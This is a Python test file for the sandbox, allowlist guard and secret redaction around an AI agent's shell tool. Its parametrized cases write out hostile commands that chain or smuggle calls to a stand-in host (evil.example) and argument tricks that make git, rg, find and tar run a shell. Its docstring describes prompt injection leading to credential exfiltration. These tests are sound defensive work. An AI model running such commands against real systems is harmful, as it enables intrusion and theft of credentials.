"""The shell capability: whether it exists, where it runs, and what it may run.

0.2.0 removed the shipped shell server because a shell beside a web-search tool
is an injection path to credential exfiltration. Every assertion here is about
that reasoning still holding now that the shell is the feature, so each one is
worth breaking on purpose before trusting it.
"""

from __future__ import annotations

import pytest

from mcp_agent.profiles import Profile, ShellSettings, is_allowed
from mcp_agent.shell import (
    SHELL_TOOL_NAME,
    build_execution_policy,
    build_shell_middleware,
    configured_policy,
    resolve_policy,
    resolve_workspace,
    shell_enabled,
)


def _profile(**shell: object) -> Profile:
    settings = {"enabled": True, "allow": ("ls", "git")}
    settings.update(shell)
    return Profile(name="p", shell=ShellSettings(**settings))  # type: ignore[arg-type]


# --- Two switches, both of which must be on ------------------------------------


def test_the_operator_switch_is_off_unless_set(monkeypatch):
    monkeypatch.delenv("MCP_ENABLE_SHELL", raising=False)
    assert shell_enabled() is False


@pytest.mark.parametrize("value", ["", "1", "yes", "TRUE ", "false", "no"])
def test_only_the_word_true_enables_the_shell(monkeypatch, value):
    """`1` and `yes` look like consent and are not it.

    `TRUE ` is: the value is stripped and lowered, so an operator who typed a
    trailing space still gets what they asked for.
    """
    monkeypatch.setenv("MCP_ENABLE_SHELL", value)
    assert shell_enabled() is (value.strip().lower() == "true")


def test_a_profile_alone_does_not_get_a_shell(monkeypatch):
    """A profile is a file someone may have been handed."""
    monkeypatch.delenv("MCP_ENABLE_SHELL", raising=False)
    assert build_shell_middleware(_profile()) == []


def test_the_operator_switch_alone_does_not_get_a_shell(monkeypatch):
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")
    assert build_shell_middleware(Profile(name="p")) == []


def test_both_switches_build_the_shell_and_its_guard(monkeypatch):
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")

    built = build_shell_middleware(_profile())

    names = [type(m).__name__ for m in built]
    assert names == [
        "ShellAllowlistMiddleware",
        "RedactionArtifactScrubber",
        "ShellToolMiddleware",
    ], names


def test_the_guard_comes_before_the_tool_it_guards(monkeypatch):
    """Listed after, it would wrap nothing that matters."""
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")

    built = build_shell_middleware(_profile())

    assert type(built[0]).__name__ == "ShellAllowlistMiddleware"
    assert any(tool.name == SHELL_TOOL_NAME for tool in built[-1].tools)


# --- Where a command runs -------------------------------------------------------


def test_the_default_policy_is_a_sandbox_with_no_network(monkeypatch):
    """`network_enabled=False` is the half of the 0.2.0 attack this closes."""
    monkeypatch.delenv("MCP_SHELL_POLICY", raising=False)

    policy = build_execution_policy(_profile())

    assert type(policy).__name__ == "DockerExecutionPolicy"
    assert policy.network_enabled is False
    assert policy.read_only_rootfs is True
    assert policy.user == "nobody"


def test_the_profile_command_timeout_reaches_the_policy(monkeypatch):
    monkeypatch.delenv("MCP_SHELL_POLICY", raising=False)
    assert build_execution_policy(_profile(command_timeout=12)).command_timeout == 12


def test_a_profile_asking_for_the_host_is_sandboxed_anyway(monkeypatch):
    """A profile must not be able to opt a deployment out of its sandbox."""
    monkeypatch.delenv("MCP_SHELL_POLICY", raising=False)

    assert resolve_policy(_profile(policy="host")) == "docker"
    assert type(build_execution_policy(_profile(policy="host"))).__name__ == (
        "DockerExecutionPolicy"
    )


def test_the_host_policy_needs_both_the_profile_and_the_operator(monkeypatch):
    monkeypatch.setenv("MCP_SHELL_POLICY", "host")

    assert resolve_policy(_profile(policy="host")) == "host"
    assert type(build_execution_policy(_profile(policy="host"))).__name__ == ("HostExecutionPolicy")


def test_the_operator_alone_does_not_move_a_profile_to_the_host(monkeypatch):
    """MCP_SHELL_POLICY=host permits the host; it does not impose it."""
    monkeypatch.setenv("MCP_SHELL_POLICY", "host")
    assert resolve_policy(_profile(policy="docker")) == "docker"


@pytest.mark.parametrize("bad", ["", "yolo", "DOCKER!"])
def test_a_meaningless_policy_override_is_ignored(monkeypatch, bad):
    monkeypatch.setenv("MCP_SHELL_POLICY", bad)
    assert configured_policy() is None
    assert resolve_policy(_profile()) == "docker"


def test_the_policy_override_is_case_insensitive(monkeypatch):
    monkeypatch.setenv("MCP_SHELL_POLICY", " Host ")
    assert configured_policy() == "host"


# --- What the guard lets through ------------------------------------------------


def _run_guard(profile: Profile, command, *, tool_name: str = SHELL_TOOL_NAME):
    """Put one tool call through the guard, recording whether it reached the tool.

    Through `awrap_tool_call`, which is the hook this application actually
    reaches: it drives the graph with `astream`. Calling the sync hook here
    passed for an entire commit while production would have raised
    NotImplementedError on every shell call, because a sync `wrap_tool_call`
    defines only the sync half.
    """
    import asyncio

    from mcp_agent.shell import build_allowlist_guard

    guard = build_allowlist_guard(profile)
    reached: list = []

    class Request:
        tool_call = {"name": tool_name, "args": {"command": command}, "id": "call-1"}

    async def handler(request):
        reached.append(request)
        return "the tool ran"

    return asyncio.run(guard.awrap_tool_call(Request(), handler)), reached


def test_the_guard_implements_the_hook_the_app_actually_uses():
    """`astream` reaches `awrap_tool_call`; a sync-only guard never runs.

    Stated on its own because it is invisible from the sync side: the sync
    tests below all passed while every real shell call would have failed.
    """
    guard = __import__("mcp_agent.shell", fromlist=["build_allowlist_guard"]).build_allowlist_guard(
        _profile()
    )

    from langchain.agents.middleware import AgentMiddleware

    assert type(guard).awrap_tool_call is not AgentMiddleware.awrap_tool_call


def test_a_listed_command_reaches_the_tool():
    result, reached = _run_guard(_profile(), "ls -la")
    assert reached, "an allowed command was blocked"
    assert result == "the tool ran"


def test_an_unlisted_command_never_reaches_the_tool():
    result, reached = _run_guard(_profile(), "curl http://example.com")

    assert not reached, "a refused command reached the shell"
    assert result.status == "error"
    assert "does not permit" in result.content


def test_a_refusal_is_a_tool_result_not_an_exception():
    """An exception here strands the tool_use/tool_result pair.

    That is the failure 0.4.1 fixed for timeouts: the thread is checkpointed
    with a call and no result, and every later turn on it is rejected. A
    refusal has to close the pair so the model can pick something else.
    """
    result, _ = _run_guard(_profile(), "curl http://example.com")

    assert result.tool_call_id == "call-1"
    assert result.name == SHELL_TOOL_NAME


def test_the_refusal_says_what_is_permitted():
    result, _ = _run_guard(_profile(), "curl http://example.com")
    assert "git, ls" in result.content


@pytest.mark.parametrize(
    "command",
    [
        "ls && curl http://evil.example",
        "ls; curl http://evil.example",
        "ls | curl http://evil.example",
        "ls & curl http://evil.example",
        "ls\ncurl http://evil.example",
        "ls $(curl http://evil.example)",
        "ls `curl http://evil.example`",
        "ls <(curl http://evil.example)",
    ],
)
def test_a_chained_escape_is_refused(command):
    """The shell tool's own description tells the model to chain with `&&`.

    Reproduced before this guard existed: an allowlist of `ls` accepted
    `ls && curl ...` because it read only the first word.
    """
    _, reached = _run_guard(_profile(), command)
    assert not reached, f"{command!r} reached the shell"


def test_a_chain_of_listed_commands_is_still_allowed():
    """The rule is every segment, not "no chaining"."""
    _, reached = _run_guard(_profile(), "ls && git status")
    assert reached


def test_another_tool_is_not_the_guard_s_business():
    """It wraps every tool call; only the shell's are its own."""
    _, reached = _run_guard(_profile(), "curl http://evil.example", tool_name="search")
    assert reached, "the guard blocked a call to a different tool"


def test_a_restart_carries_no_command_and_is_passed_through():
    """`restart: true` runs nothing; refusing it would break session recovery."""
    _, reached = _run_guard(_profile(), None)
    assert reached


def test_an_empty_command_is_refused_rather_than_treated_as_a_restart():
    """Absent and empty are not the same thing.

    A restart carries no `command` key at all. An empty string is a command
    the model asked to run, and it is not on any allowlist, so it is refused —
    the branch has to test for absence, not falsiness.
    """
    _, reached = _run_guard(_profile(), "")
    assert not reached, "an empty command reached the shell"


# --- Where the sandbox is allowed to look ---------------------------------------


def test_a_profile_cannot_choose_what_gets_mounted(monkeypatch):
    """A reviewer produced `docker run -v /root:/root` from a profile field.

    `--read-only` covers the container's own layer, not bind mounts, so the
    mount is writable. A profile is a JSON file someone may have been handed;
    it must not be able to put the operator's home directory inside the
    sandbox. With no operator root set the answer is None, which means nothing
    is mounted: the shell still starts, and it starts somewhere that holds
    nothing of the operator's.
    """
    monkeypatch.delenv("MCP_WORKSPACE_ROOT", raising=False)

    assert resolve_workspace(_profile(workspace_root="/root")) is None


def test_a_workspace_inside_the_operator_root_is_honoured(monkeypatch, tmp_path):
    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(tmp_path))
    inside = tmp_path / "project"
    inside.mkdir()

    assert resolve_workspace(_profile(workspace_root=str(inside))) == str(inside)


def test_the_root_itself_is_allowed(monkeypatch, tmp_path):
    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(tmp_path))
    assert resolve_workspace(_profile(workspace_root=str(tmp_path))) == str(tmp_path)


def test_a_workspace_outside_the_operator_root_is_refused(monkeypatch, tmp_path):
    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(tmp_path / "allowed"))
    (tmp_path / "allowed").mkdir()

    assert resolve_workspace(_profile(workspace_root=str(tmp_path / "elsewhere"))) is None


def test_a_sibling_that_merely_shares_a_prefix_is_refused(monkeypatch, tmp_path):
    """`/workspace-other` starts with `/workspace` as text and is not inside it."""
    root = tmp_path / "workspace"
    root.mkdir()
    (tmp_path / "workspace-other").mkdir()
    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(root))

    assert resolve_workspace(_profile(workspace_root=str(tmp_path / "workspace-other"))) is None


def test_escaping_upward_is_refused(monkeypatch, tmp_path):
    root = tmp_path / "workspace"
    root.mkdir()
    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(root))

    assert resolve_workspace(_profile(workspace_root=str(root / ".." / "elsewhere"))) is None


def test_a_profile_naming_no_workspace_gets_none(monkeypatch, tmp_path):
    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(tmp_path))
    assert resolve_workspace(_profile()) is None


# --- The image commands actually run in -----------------------------------------


def test_the_default_image_has_the_shell_the_middleware_invokes():
    """`ShellToolMiddleware` runs commands through `/bin/bash`.

    Alpine does not ship bash, so the first pinned image would have failed
    every command. That failure is safe in itself, but it pushes an operator
    debugging a broken shell toward MCP_SHELL_POLICY=host, which is the
    configuration all of this exists to keep exceptional.
    """
    from mcp_agent.shell import DEFAULT_SANDBOX_IMAGE

    assert "alpine" not in DEFAULT_SANDBOX_IMAGE
    assert DEFAULT_SANDBOX_IMAGE == "python:3.12-slim"


def test_the_image_is_pinned_not_floating():
    from mcp_agent.shell import DEFAULT_SANDBOX_IMAGE

    assert ":" in DEFAULT_SANDBOX_IMAGE and not DEFAULT_SANDBOX_IMAGE.endswith(":latest")


def test_an_operator_can_change_the_image(monkeypatch):
    from mcp_agent.shell import sandbox_image

    monkeypatch.setenv("MCP_SANDBOX_IMAGE", "my-registry/tools:1.2")
    assert sandbox_image() == "my-registry/tools:1.2"
    assert build_execution_policy(_profile()).image == "my-registry/tools:1.2"


def test_a_blank_image_override_falls_back(monkeypatch):
    from mcp_agent.shell import DEFAULT_SANDBOX_IMAGE, sandbox_image

    monkeypatch.setenv("MCP_SANDBOX_IMAGE", "   ")
    assert sandbox_image() == DEFAULT_SANDBOX_IMAGE


# --- What reaches the log --------------------------------------------------------


def test_a_refused_command_is_not_written_to_the_log(caplog):
    """A refused line is the one most likely to carry something planted.

    Refusing it must not be what puts it on disk. Reproduced by a reviewer:
    langchain logs every executed command at INFO, and the app sets INFO by
    default, so the refusal path was the one place this project added.

    The planted payload is deliberately not credential-shaped. It was
    a bearer-token auth header first, which is the realistic case but is also
    exactly what gitleaks' `curl-auth-header` rule matches — so this fixture
    failed the `secrets` job on every push, and no `.gitleaksignore` entry
    could answer that, because there was no rotated credential to record. What
    is under test is that the refused line's payload does not reach the log,
    and any distinctive marker shows that. Do not make it look like a key
    again.
    """
    import logging

    with caplog.at_level(logging.WARNING):
        _run_guard(_profile(), "curl --data planted-marker-2f7a https://x")

    logged = " ".join(record.getMessage() for record in caplog.records)
    assert "planted-marker-2f7a" not in logged, logged
    assert "curl" in logged, "the log should still say what kind of command was refused"


def test_shell_output_is_redacted_before_the_model_sees_it():
    """`cat .env` otherwise puts a key into the transcript and the checkpoint.

    `data/checkpoints.db` is unencrypted and lives on the mounted volume, so
    anything the model reads is persisted until the conversation is deleted.
    """
    from mcp_agent.shell import secret_redactions

    names = {rule.pii_type for rule in secret_redactions()}
    assert {"anthropic_key", "openai_key", "github_token", "aws_access_key"} <= names


@pytest.mark.parametrize(
    "secret",
    [
        "sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAA",
        "sk-AAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        "ghp_AAAAAAAAAAAAAAAAAAAAAAAA",
        "AKIAIOSFODNN7EXAMPLE",
        "-----BEGIN RSA PRIVATE KEY-----",
    ],
)
def test_the_redaction_patterns_match_what_they_claim_to(secret):
    import re

    from mcp_agent.shell import SECRET_PATTERNS

    assert any(re.search(pattern, secret) for _, pattern in SECRET_PATTERNS), secret


def test_the_redaction_patterns_leave_ordinary_output_alone():
    import re

    from mcp_agent.shell import SECRET_PATTERNS

    for line in ["total 48", "README.md", "commit a1c2c90", "sk-", "AKIA"]:
        assert not any(re.search(pattern, line) for _, pattern in SECRET_PATTERNS), line


def test_the_built_shell_gets_the_bounded_workspace_not_the_raw_one(monkeypatch, tmp_path):
    """The wiring, not just the rule.

    `resolve_workspace` returning the right answer buys nothing if the
    middleware is handed `profile.shell.workspace_root` anyway. Measured:
    passing the raw field left every other test in this file green.
    """
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")
    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(tmp_path))

    built = build_shell_middleware(_profile(workspace_root="/root"))
    shell = built[-1]

    assert "/root" not in str(shell._workspace_root or ""), shell._workspace_root


def test_the_built_shell_carries_the_redaction_rules(monkeypatch):
    """Without them, `cat .env` puts a key in the transcript and the checkpoint."""
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")

    shell = build_shell_middleware(_profile())[-1]
    kinds = {rule.pii_type for rule in (shell._redaction_rules or ())}

    assert "anthropic_key" in kinds, kinds


# --- The wiring, not just the rules ---------------------------------------------
#
# A mutation pass found every predicate in this module pinned and every line
# that *connects* them to the running agent free. That is the more dangerous
# half: the rules being right buys nothing if the shell is built without them.


def test_the_sandbox_policy_reaches_the_middleware(monkeypatch):
    """`ShellToolMiddleware`'s own default is `HostExecutionPolicy`.

    So this line going missing does not disable the sandbox — it moves every
    command onto the machine serving the page. Fail-open, in the one place
    this module exists to keep closed.
    """
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")
    monkeypatch.delenv("MCP_SHELL_POLICY", raising=False)

    shell = build_shell_middleware(_profile())[-1]
    policy = shell._execution_policy

    assert type(policy).__name__ == "DockerExecutionPolicy", type(policy).__name__
    assert policy.network_enabled is False
    assert policy.read_only_rootfs is True
    assert policy.user == "nobody"


def test_a_shell_that_did_not_take_our_policy_is_refused(monkeypatch):
    """Fail closed rather than tidy: an unknown policy runs no commands."""
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")

    import langchain.agents.middleware as mw

    class Ignores(mw.ShellToolMiddleware):
        def __init__(self, **kwargs):
            kwargs.pop("execution_policy", None)
            super().__init__(**kwargs)

    monkeypatch.setattr(mw, "ShellToolMiddleware", Ignores)

    with pytest.raises(RuntimeError, match="did not take the execution policy"):
        build_shell_middleware(_profile())


def test_the_resolved_workspace_reaches_the_middleware(monkeypatch, tmp_path):
    """Positively, not by absence.

    The earlier version of this asserted `"/root" not in ...`, which `None`
    also satisfies — so it could not tell "resolved correctly" from "never
    passed at all", and the mutation dropping the argument survived it.
    """
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")
    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(tmp_path))
    inside = tmp_path / "project"
    inside.mkdir()

    shell = build_shell_middleware(_profile(workspace_root=str(inside)))[-1]

    assert str(shell._workspace_root) == str(inside)


def test_the_approval_gate_is_in_the_built_shell(monkeypatch):
    """The guard, then the gate, then the tool — assembled, not hand-listed."""
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")

    names = [type(m).__name__ for m in build_shell_middleware(_profile(approve=("git push",)))]

    assert names == [
        "ShellAllowlistMiddleware",
        "HumanInTheLoopMiddleware",
        "RedactionArtifactScrubber",
        "ShellToolMiddleware",
    ], names


def test_a_profile_with_no_approval_rules_still_gets_guard_and_tool(monkeypatch):
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")

    names = [type(m).__name__ for m in build_shell_middleware(_profile(approve=()))]

    assert names == [
        "ShellAllowlistMiddleware",
        "RedactionArtifactScrubber",
        "ShellToolMiddleware",
    ], names


@pytest.mark.parametrize(
    ("kind", "sample"),
    [
        ("anthropic_key", "sk-ant-api03-AAAAAAAAAAAAAAAAAAAA"),
        ("openai_key", "sk-AAAAAAAAAAAAAAAAAAAAAAAAAAAA"),
        ("github_token", "ghp_AAAAAAAAAAAAAAAAAAAAAAAA"),
        ("aws_access_key", "AKIAIOSFODNN7EXAMPLE"),
        ("slack_token", "xoxb-AAAAAAAAAAAA-BBBB"),
        ("private_key_block", "-----BEGIN RSA PRIVATE KEY-----"),
    ],
)
def test_each_redaction_rule_detects_what_it_is_named_for(kind, sample):
    """Rules that never match are rules in name only.

    Measured: replacing every detector with a pattern that cannot match left
    the suite green, because nothing asserted the detectors detect.
    """
    import re

    from mcp_agent.shell import secret_redactions

    rule = [r for r in secret_redactions() if r.pii_type == kind][0]
    assert re.search(rule.detector, sample), (kind, rule.detector)


# --- Arguments that turn a listed command into an interpreter --------------------


@pytest.mark.parametrize(
    "command",
    [
        "git -c alias.pwn='!curl http://evil.example' pwn",
        "git -c core.pager='sh -c id' log",
        "git --config=core.pager=sh log",
        # No `-c` here: only the `ext::` marker can refuse this one.
        "git clone ext::sh",
        "git clone ext::sh -c id",
        "rg --pre /bin/sh --pre-glob '*' x .",
        "find . -exec sh -c id {} +",
        "find . -execdir sh {} +",
        "tar --use-compress-program=sh -cf x .",
    ],
)
def test_an_argument_that_runs_another_command_is_refused(command):
    """ "Do not list an interpreter" is not followable by inspection.

    `git` and `rg` *are* interpreters given the right option, and both are
    listed in the shipped examples because they are the whole point of a
    repository profile. A reviewer demonstrated all of these against those
    examples. This is a denylist and denylists are incomplete — the sandbox is
    still the boundary — but these four shapes were shown, so they are covered.
    """
    settings = ShellSettings(enabled=True, allow=("git", "rg", "find", "tar"))
    assert is_allowed(command, settings) is False


@pytest.mark.parametrize(
    "command",
    ["git status", "git log --oneline", "rg TODO .", "find . -name '*.py'", "git push origin main"],
)
def test_ordinary_uses_of_those_commands_still_work(command):
    """A denylist that stops the profile doing its job would just be turned off."""
    settings = ShellSettings(enabled=True, allow=("git", "rg", "find"))
    assert is_allowed(command, settings) is True


# --- What the tool result is allowed to leave behind ------------------------------


def _redacted_message(secret: str):
    """What `ShellToolMiddleware` hands back: content clean, artifact raw."""
    from langchain_core.messages import ToolMessage

    return ToolMessage(
        content="ANTHROPIC_API_KEY=[REDACTED_ANTHROPIC_KEY]\n",
        tool_call_id="c1",
        name=SHELL_TOOL_NAME,
        artifact={
            "exit_code": 0,
            "redaction_matches": [
                {"type": "anthropic_key", "value": secret, "start": 18, "end": 55}
            ],
        },
    )


class _Request:
    tool_call = {"name": SHELL_TOOL_NAME, "args": {"command": "cat .env"}, "id": "c1"}


def _scrub(message):
    import asyncio

    from mcp_agent.shell import build_artifact_scrubber

    async def handler(_request):
        return message

    async def run():
        return await build_artifact_scrubber().awrap_tool_call(_Request(), handler)

    return asyncio.run(run())


def test_the_cleartext_secret_does_not_survive_the_tool_result():
    """Redaction cleaned the content and handed the secret back beside it.

    `artifact["redaction_matches"]` is a list of `PIIMatch`, and
    `PIIMatch["value"]` is the unredacted match. A security review ran this end
    to end and read an Anthropic key off `data/checkpoints.db` while both the
    screen and the model showed `[REDACTED_ANTHROPIC_KEY]` — the redaction had
    made the leak quieter, not smaller, which is the worse of the two.
    """
    secret = "sk-ant-api03-REALLOOKINGSECRETVALUE123456"

    scrubbed = _scrub(_redacted_message(secret))

    assert secret not in str(scrubbed.artifact)
    assert secret not in str(scrubbed.content)


def test_scrubbing_keeps_the_count_and_the_pairing():
    """What is worth keeping is kept: how many, and which tool call it answers.

    "three secrets were removed here" is useful when debugging and carries
    nothing. Dropping the whole message instead would strand the tool_use and
    poison the thread, which is the failure 0.4.1 fixed.
    """
    scrubbed = _scrub(_redacted_message("sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAA"))

    matches = scrubbed.artifact["redaction_matches"]
    assert len(matches) == 1
    assert matches[0]["type"] == "anthropic_key"
    assert "value" not in matches[0]
    assert scrubbed.artifact["exit_code"] == 0
    assert scrubbed.tool_call_id == "c1"


def test_a_result_with_nothing_redacted_is_passed_through_untouched():
    """The ordinary case must not be reshaped by a control for the rare one."""
    from langchain_core.messages import ToolMessage

    plain = ToolMessage(
        content="ok", tool_call_id="c1", name=SHELL_TOOL_NAME, artifact={"exit_code": 0}
    )

    assert _scrub(plain) is plain


def test_the_secret_does_not_reach_the_checkpoint_on_disk(tmp_path):
    """The claim three documents make, tested where they make it.

    `docs/PROFILES.md`, `shell.py` and `CHANGELOG.md` all say the redaction is
    there because what the shell reads lands in `data/checkpoints.db`
    unencrypted. That was the one place it did not hold. Asserting on the
    bytes, through the project's own checkpointer, because asserting on the
    message shape is what let this ship.
    """
    import asyncio

    import aiosqlite
    from langchain_core.runnables import RunnableConfig
    from langgraph.checkpoint.sqlite.aio import AsyncSqliteSaver

    secret = "sk-ant-api03-REALLOOKINGSECRETVALUE123456"
    scrubbed = _scrub(_redacted_message(secret))
    db = tmp_path / "checkpoints.db"

    async def write_it() -> None:
        connection = await aiosqlite.connect(str(db))
        saver = AsyncSqliteSaver(connection)
        await saver.setup()
        await saver.aput(
            RunnableConfig(configurable={"thread_id": "t", "checkpoint_ns": ""}),
            {
                "v": 1,
                "id": "c1",
                "ts": "2026-09-10T00:00:00+00:00",
                "channel_values": {"messages": [scrubbed]},
                "channel_versions": {"messages": 1},
                "versions_seen": {},
            },
            {"source": "loop", "step": 1, "parents": {}},
            {"messages": 1},
        )
        await connection.close()

    asyncio.run(write_it())
    assert secret.encode() not in db.read_bytes()
